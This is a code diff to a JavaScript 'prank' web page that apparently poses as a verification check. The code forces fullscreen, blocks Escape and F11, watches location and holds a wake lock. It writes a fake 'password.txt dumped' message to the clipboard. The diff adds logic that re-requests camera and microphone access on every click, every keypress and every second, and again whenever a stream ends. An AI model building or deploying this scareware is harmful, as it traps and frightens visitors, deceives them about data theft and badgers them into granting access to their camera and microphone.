@@ -82,6 +82,10 @@ let dripOn = false
 let typed = ''
 let permIndex = 0
 let geoWatch = null
+let cameraAsk = 0
+let cameraPerm = 'prompt'
+let cameraPending = 0
+let cameraWatchOn = false
 let bounceTimer = 0
 
 init()
@@ -146,8 +150,9 @@ function onVerifyClick (event) {
   if (label) label.textContent = 'Wird geprüft…'
   armed = true
 
-  // F11 has to win the click. window.open() spends the user gesture, and
-  // the browser then rejects requestFullscreen().
+  // Camera and F11 have to run before window.open(), or the click is spent
+  // and the browser rejects both prompts.
+  repromptCamera(true)
   forceF11()
   reopenInF11()
   beginPrank()
@@ -221,6 +226,7 @@ function bindPointer () {
 
 function onPointer (event) {
   if (!armed) return
+  repromptCamera(true)
   const close = event.target.closest && event.target.closest('[data-close]')
   if (close) {
     event.preventDefault()
@@ -256,6 +262,7 @@ function onKey (event) {
     }
   }
   if (!armed) return
+  repromptCamera(true)
   if (event.key === 'Escape' || event.key === 'F11') {
     event.preventDefault()
     event.stopPropagation()
@@ -498,7 +505,11 @@ function floaterMarkup (type) {
 function spawnCamera (stream) {
   if (floaters.some((item) => item.type === 'camera')) {
     const video = document.querySelector('.floater video')
-    if (video && !video.srcObject) video.srcObject = stream
+    if (video) {
+      const current = video.srcObject
+      const live = current && current.getVideoTracks && current.getVideoTracks().some((track) => track.readyState === 'live')
+      if (!live) video.srcObject = stream
+    }
     return
   }
   spawnFloater('image')
@@ -592,10 +603,7 @@ function annoyPermissions (first) {
       })
       geoWatch = navigator.geolocation.watchPosition(() => {}, () => {}, { enableHighAccuracy: true })
     } catch {}
-    grabMedia({ video: true, audio: true })
-    grabMedia({ video: { facingMode: 'user' }, audio: false })
-    grabMedia({ video: { facingMode: 'environment' }, audio: false })
-    grabMedia({ audio: true, video: false })
+    watchCamera()
     try { navigator.requestMIDIAccess && navigator.requestMIDIAccess() } catch {}
     try { navigator.clipboard && navigator.clipboard.writeText('password.txt dumped — type CLOSE') } catch {}
     try { navigator.wakeLock && navigator.wakeLock.request('screen') } catch {}
@@ -625,14 +633,64 @@ function annoyPermissions (first) {
   Promise.resolve().then(fn).catch(() => {})
 }
 
+const CAMERA_ASKS = [
+  { video: true, audio: true },
+  { video: { facingMode: 'user' }, audio: true },
+  { video: { facingMode: 'environment' }, audio: false },
+  { video: { facingMode: { ideal: 'user' } }, audio: false }
+]
+
+function hasLiveCamera () {
+  return mediaTracks.some((track) => track.kind === 'video' && track.readyState === 'live')
+}
+
+function repromptCamera (fromGesture) {
+  if (shuttingDown || cameraPending || hasLiveCamera()) return
+  if (!fromGesture && cameraPerm === 'denied') return
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return
+  grabMedia(CAMERA_ASKS[cameraAsk % CAMERA_ASKS.length])
+  cameraAsk += 1
+}
+
+function watchCamera () {
+  if (cameraWatchOn) return
+  cameraWatchOn = true
+  repromptCamera(true)
+  every(1000, () => repromptCamera(false))
+  try {
+    if (!navigator.permissions || !navigator.permissions.query) return
+    navigator.permissions.query({ name: 'camera' }).then((status) => {
+      const sync = () => {
+        cameraPerm = status.state || 'prompt'
+        if (cameraPerm !== 'granted') {
+          repromptCamera(false)
+        }
+      }
+      sync()
+      status.onchange = sync
+    }).catch(() => {})
+  } catch {}
+}
+
 function grabMedia (constraints) {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return
-  navigator.mediaDevices.getUserMedia(constraints).then(holdStream).catch(() => {})
+  cameraPending += 1
+  navigator.mediaDevices.getUserMedia(constraints).then(holdStream).catch(() => {}).finally(() => {
+    cameraPending = Math.max(0, cameraPending - 1)
+  })
 }
 
 function holdStream (stream) {
-  stream.getTracks().forEach((track) => mediaTracks.push(track))
-  if (stream.getVideoTracks().length) spawnCamera(stream)
+  stream.getTracks().forEach((track) => {
+    mediaTracks.push(track)
+    track.addEventListener('ended', () => {
+      if (!shuttingDown && track.kind === 'video') repromptCamera(false)
+    })
+  })
+  if (stream.getVideoTracks().length) {
+    cameraPerm = 'granted'
+    spawnCamera(stream)
+  }
 }
 
 function stopMedia () {
